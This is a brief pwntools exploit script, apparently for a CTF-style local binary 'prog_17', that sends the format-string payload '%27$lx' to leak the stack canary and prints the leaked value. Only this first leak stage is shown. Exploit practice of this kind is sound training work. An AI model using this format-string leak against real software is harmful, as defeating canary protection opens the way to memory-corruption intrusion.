from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')

#context.log_level = 'DEBUG'

binary = ELF('prog_17')

p = process('./prog_17')

###### STAGE 1 - LEAK CANARY COOKIE ######

format1 = "%27$lx"

p.recvline()
p.sendline(format1)

leak = p.recvline()[8:].strip()

canary_cookie = int(leak, 16)

print("\n")

log.success("Canary Value: " +hex(canary_cookie))

###### END ######

